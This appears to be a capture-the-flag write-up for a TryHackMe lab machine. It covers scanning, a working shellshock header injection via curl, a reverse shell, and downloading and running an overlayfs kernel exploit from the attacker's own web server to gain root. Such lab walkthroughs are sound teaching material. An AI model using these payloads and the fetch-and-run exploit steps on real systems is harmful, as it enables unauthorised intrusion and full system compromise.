# 0day

A pretty easy THM room. You just need to know what to do, and the rest is a cake-walk.

[Play](https://tryhackme.com/room/0day)

## 1. Enumeration and Scanning

### 1.1. Web Exploration

![The 0day website homepage](https://imgur.com/jJe7K0O.png)

We find the `/secret/` directory in the enumeration.
![The secret directory](https://imgur.com/woRmoi9.png)

We find a `id_rsa` key, in `/backup/`

![RSA key in backups folder](https://i.imgur.com/W6CRPti.png)

### 1.2. Web Enumeration: Nikto
```
┌──(kali㉿kali)-[~]
└─$ nikto -h 10.10.157.88      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.157.88
+ Target Hostname:    10.10.157.88
+ Target Port:        80
+ Start Time:         2021-05-28 04:11:18 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
```

Interesting. We see a shellshock vulerability. Going to the page, we see:

![cgi-bin test page](https://i.imgur.com/c2M3UV2.png)

### 1.3. Port Scanning

```
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Nothing too ordinary. Let's also confirm the presence of shell-shock?

```
┌──(kali㉿kali)-[/tmp]
└─$ nmap -sV --script http-shellshock --script-args uri=/cgi-bin/test.cgi,cmd=ls 10.10.157.88
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 04:15 EDT
Nmap scan report for 10.10.157.88
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.7 (Ubuntu) Server at 10.10.157.88 Port 80</address>
|   </body></html>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.64 seconds
```

Voila! Its there. Let's look it up.

## 2. Foothold

[Exploit shellshock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)

Let's test this once more, just to be sure.
```
┌──(kali㉿kali)-[/tmp]
└─$ curl -H "User-agent: () { :;}; echo; echo vulnerable" http://10.10.157.88/cgi-bin/test.cgi
vulnerable
Content-type: text/html

Hello World!
```

And, putting a reverse shell ....

![Getting a reverse shell](https://i.imgur.com/gAPdU4W.png)

We are in!

## 3. PrivEsc

Since we do not have the sudo password, that route is blocked. I checked the setuid bit set files - there are none. I also saw the Kernel version for fun.

```
www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/ryan$ gcc --version
gcc --version
gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

```

So we have an old kernelt, which points to the overlayfs exploit. We have gcc too, so that's great. The architecture is base 64. [Here is the exploit](https://github.com/lucyoa/kernel-exploits/blob/master/overlayfs/ofs_64). 

Startup a server on your own machine.

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.157.88 - - [28/May/2021 04:32:40] "GET /ofs_64 HTTP/1.1" 200 -
```

Get the executable.

```
www-data@ubuntu:/tmp$ wget 10.17.8.184/ofs_64 
wget 10.17.8.184/ofs_64
--2021-05-28 01:32:40--  http://10.17.8.184/ofs_64
Connecting to 10.17.8.184:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 886664 (866K) [application/octet-stream]
Saving to: 'ofs_64'

100%[======================================>] 886,664      311KB/s   in 2.8s   

2021-05-28 01:32:44 (311 KB/s) - 'ofs_64' saved [886664/886664]

www-data@ubuntu:/tmp$ 
```

Running it however, we get an error. The fixes I saw were all about getting g++ or updating the repository thingies. We do not have internet ;-;

Checking the PATH was the next best move then. I put the default ubuntu PATH as below, and ...

```
www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
<t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin         
www-data@ubuntu:/tmp$ ./ofs_64 
./ofs_64 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

System compromised!

